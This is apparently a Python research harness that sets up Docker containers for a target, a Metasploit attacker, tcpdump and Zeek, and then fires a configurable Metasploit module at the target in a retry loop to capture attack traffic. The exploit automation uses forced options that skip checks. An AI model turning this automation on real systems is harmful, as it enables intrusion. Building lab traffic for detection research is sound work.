import docker
import json
import time

class BaseRunner:
    def __init__(self, docker_client, network_name="set_framework_net", 
                 volume_name="set_logs", target_image="", msf_exploit=""):
        self.client=docker_client
        self.target=None
        self.attack=None
        self.tcpdump=None
        self.zeek=None
        #these should be setup on init.  However, should they be cleaned first???
        self.network=None
        self.volume=None
        self.target_image=target_image
        self.msf_exploit=msf_exploit
        
    def network_cleanup(self):
        try:
            net = self.client.networks.get("set_framework_net")
            net.remove()
        except:
            pass
            
    def volume_cleanup(self):
        try:
            vol = self.client.volumes.get("set_logs")
            vol.remove()
        except:
            pass

    def network_setup(self):
        net = self.client.networks.create("set_framework_net", driver="bridge")
        return net

    def volume_setup(self):
        vol = self.client.volumes.create(name="set_logs")
        return vol

    def zeek_setup(self):
        dk_zeek = self.client.containers.run("zeek/zeek", command="/bin/bash", detach=True, name="zeek", 
                                        tty=True, network="set_framework_net",
                                        volumes={"set_logs":{"bind":"/data", "mode":'rw'}})
        dk_zeek.exec_run(cmd = ["mkdir","-p","/data/zeek/latest/"])
        dk_zeek.exec_run(cmd = ["mkdir","-p","/data/pcap/"])
        dk_zeek.exec_run(cmd = ["mkdir","-p","/data/logs/"])
        self.zeek = dk_zeek

    def zeek_cleanup(self):
        self.zeek.stop()
        self.zeek.remove()

    def zeek_parse(self):
        pass
    
    def target_setup(self):
        #tcpdump setup should happen automaticly after target setup
        dk_target = self.client.containers.run(self.target_image,
                                  detach=True, name="target",
                                  network="set_framework_net")
        self.target=dk_target

    def target_cleanup(self):
        if self.tcpdump:
            self.tcpdump_cleanup()
        self.target.stop()
        self.target.remove()

    def tcpdump_setup(self):
        cmd = "-U -v -w /data/target.pcap" #I shortened this and removed the pcap dir
        dk_tcpdump = self.client.containers.run("tcpdump",command=cmd, detach=True,
                                  name="tcpdump", privileged=True,
                                  network="container:target", #TODO: this should be derived from self.target.name
                                  volumes={"set_logs":{"bind":"/data","mode":'rw'}})
        self.tcpdump=dk_tcpdump

    def tcpdump_cleanup(self):
        self.tcpdump.stop()
        self.tcpdump.remove()

    def attack_setup(self):
        dk_attack = self.client.containers.run("metasploitframework/metasploit-framework:6.2.33",
                                 detach=True, name="attack",
                                 network="set_framework_net", tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        self.attack.stop()
        self.attack.remove()

    def setup_all(self):
        self.network_cleanup()
        self.volume_cleanup()
        self.network_setup()
        self.volume_setup()
        self.zeek_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self):
        self.zeek_cleanup()
        self.target_cleanup()
        self.attack_cleanup()
    
    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        args = args % (self.msf_exploit, "", "target", "attack")
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self):
        #create check to see if exploit happened.
        #if we know its an http exploit, we can check for http.log on zeek
        #if we are running MSF RPC, we can check for an open session
        return True

    def exploit_until_success(self, delay=3, tries=30):
        for i in range(tries):
            self.exploit()
            self.zeek_parse()
            if self.exploit_success():
                break
            time.sleep(delay)
        return self.exploit_success()
